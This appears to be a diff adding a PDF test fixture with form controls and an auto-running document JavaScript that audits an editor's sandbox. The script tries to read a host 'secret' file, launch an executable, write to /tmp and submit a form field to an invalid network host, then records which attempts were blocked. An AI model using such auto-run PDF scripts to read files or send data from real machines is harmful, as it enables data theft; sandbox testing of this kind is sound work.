@@ -1,0 +1,99 @@
+%PDF-1.7
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm 5 0 R /Names << /JavaScript << /Names [(safety) 15 0 R] >> >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 12 0 R /Annots [6 0 R 7 0 R 9 0 R 10 0 R 11 0 R] /Tabs /R >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+5 0 obj
+<< /Fields [6 0 R 7 0 R 8 0 R 11 0 R] /DR << /Font << /Helv 4 0 R >> >> /DA (/Helv 12 Tf 0 g) /NeedAppearances true >>
+endobj
+6 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (Input) /V (original) /Rect [72 690 300 720] /P 3 0 R /F 4 /DA (/Helv 12 Tf 0 g) /MK << /BC [0 0 0] /BG [1 1 1] >> >>
+endobj
+7 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (Check) /V /Off /AS /Off /Rect [72 632 92 652] /P 3 0 R /F 4 /AP << /N << /Off 13 0 R /Yes 14 0 R >> >> >>
+endobj
+8 0 obj
+<< /FT /Btn /Ff 32768 /T (Choice) /V /A /Kids [9 0 R 10 0 R] >>
+endobj
+9 0 obj
+<< /Type /Annot /Subtype /Widget /Parent 8 0 R /AS /A /Rect [72 570 92 590] /P 3 0 R /F 4 /AP << /N << /Off 13 0 R /A 14 0 R >> >> >>
+endobj
+10 0 obj
+<< /Type /Annot /Subtype /Widget /Parent 8 0 R /AS /Off /Rect [142 570 162 590] /P 3 0 R /F 4 /AP << /N << /Off 13 0 R /B 14 0 R >> >> >>
+endobj
+11 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Ch /Ff 131072 /T (Dropdown) /Opt [(Alpha) (Beta) (Gamma)] /V (Alpha) /Rect [72 502 272 532] /P 3 0 R /F 4 /DA (/Helv 12 Tf 0 g) /MK << /BC [0 0 0] /BG [1 1 1] >> >>
+endobj
+12 0 obj
+<< /Length 157 >>
+stream
+BT /F1 20 Tf 72 750 Td (AcroForm controls) Tj ET BT /F1 12 Tf 100 638 Td (Checkbox) Tj ET BT /F1 12 Tf 100 576 Td (A) Tj ET BT /F1 12 Tf 170 576 Td (B) Tj ET
+endstream
+endobj
+13 0 obj
+<< /Type /XObject /Subtype /Form /BBox [0 0 20 20] /Resources << >> /Length 26 >>
+stream
+q 1 w 0 G 1 1 18 18 re S Q
+endstream
+endobj
+14 0 obj
+<< /Type /XObject /Subtype /Form /BBox [0 0 20 20] /Resources << >> /Length 45 >>
+stream
+q 1 w 0 G 1 1 18 18 re S 0 g 5 5 10 10 re f Q
+endstream
+endobj
+15 0 obj
+<< /S /JavaScript /JS 16 0 R >>
+endobj
+16 0 obj
+<< /Length 798 >>
+stream
+
+var audit = ["ran"];
+var names = ["process", "require", "Deno", "fetch", "XMLHttpRequest", "getenv", "system"];
+for (var i = 0; i < names.length; ++i) audit.push(names[i] + ":" + eval("typeof " + names[i]));
+try { util.readFileIntoStream("/tmp/pdf-editor-host-secret"); audit.push("read:returned"); }
+catch(e) { audit.push("read:blocked"); }
+try { app.launchURL("file:///usr/bin/true"); audit.push("launch:attempted"); }
+catch(e) { audit.push("launch:blocked"); }
+try { this.saveAs("/tmp/pdf-editor-host-write"); audit.push("write:attempted"); }
+catch(e) { audit.push("write:blocked"); }
+try { this.submitForm({cURL:"http://example.invalid/safety", aFields:["Input"]}); audit.push("network:attempted"); }
+catch(e) { audit.push("network:blocked"); }
+this.getField("Input").value = audit.join("|");
+
+endstream
+endobj
+xref
+0 17
+0000000000 65535 f 
+0000000015 00000 n 
+0000000136 00000 n 
+0000000193 00000 n 
+0000000371 00000 n 
+0000000441 00000 n 
+0000000575 00000 n 
+0000000752 00000 n 
+0000000919 00000 n 
+0000000998 00000 n 
+0000001147 00000 n 
+0000001301 00000 n 
+0000001520 00000 n 
+0000001729 00000 n 
+0000001871 00000 n 
+0000002032 00000 n 
+0000002080 00000 n 
+trailer
+<< /Size 17 /Root 1 0 R >>
+startxref
+2930
+%%EOF
